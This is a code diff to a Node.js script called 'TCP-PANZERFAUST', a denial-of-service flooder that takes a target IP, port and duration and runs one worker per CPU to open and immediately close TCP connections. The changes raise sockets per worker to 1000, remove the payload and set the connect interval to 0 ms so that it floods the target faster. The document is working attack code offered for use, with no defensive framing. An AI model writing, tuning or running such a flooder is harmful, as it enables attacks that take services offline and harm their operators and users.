@@ -7,14 +7,13 @@ const port = parseInt(process.argv[3]) || 80;
 const duration = parseInt(process.argv[4]);
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node tcp-panzerfaust-pps.js <target_ip> <port> <duration_seconds>');
+  console.log('Usage: node tcp-min-pps.js <target_ip> <port> <duration_seconds>');
   process.exit(1);
 }
 
 const endTime = Date.now() + duration * 1000;
 const cpuCount = os.cpus().length;
-const socketsPerWorker = 500;
-const payload = Buffer.alloc(1); // 1 byte for max PPS
+const socketsPerWorker = 1000; // Push concurrency high to get max PPS
 
 function formatNumber(n) {
   const units = ['', 'K', 'M', 'B', 'T'];
@@ -31,7 +30,7 @@ if (cluster.isMaster) {
   let maxPPS = 0;
 
   console.clear();
-  console.log('TCP-PANZERFAUST [MAX PPS]');
+  console.log('TCP-PANZERFAUST [MAX PPS MIN PAYLOAD]');
   console.log('--------------------------------------');
   console.log(`Target:         ${target}:${port}`);
   console.log(`Duration:       ${duration}s`);
@@ -52,12 +51,12 @@ if (cluster.isMaster) {
 
   setInterval(() => {
     console.clear();
-    console.log('TCP-PANZERFAUST [MAX PPS]');
+    console.log('TCP-PANZERFAUST [MAX PPS MIN PAYLOAD]');
     console.log('--------------------------------------');
     console.log(`Total Packets Sent:  ${formatNumber(totalPackets)}`);
     console.log(`Max PPS:             ${formatNumber(maxPPS)}`);
     console.log(`Target:              ${target}:${port}`);
-    console.log(`Payload:             ${payload.length} byte`);
+    console.log(`Payload:             0 bytes (connect+close)`);
     console.log('--------------------------------------');
     maxPPS = 0;
   }, 2000);
@@ -77,17 +76,16 @@ if (cluster.isMaster) {
 
       const socket = net.createConnection({ host: target, port: port }, () => {
         socket.setNoDelay(true);
-        socket.write(payload, () => {
-          pps++;
-          socket.destroy();
-        });
+        pps++;
+        socket.destroy(); // Immediately close connection (fires FIN)
       });
 
       socket.on('error', () => {});
     }
 
+    // Use intervals to flood connection attempts aggressively
     for (let i = 0; i < socketsPerWorker; i++) {
-      setInterval(connectOnce, 1); // Aggressive connect rate
+      setInterval(connectOnce, 0); // "0" means ASAP in libuv, max concurrency
     }
   }
 
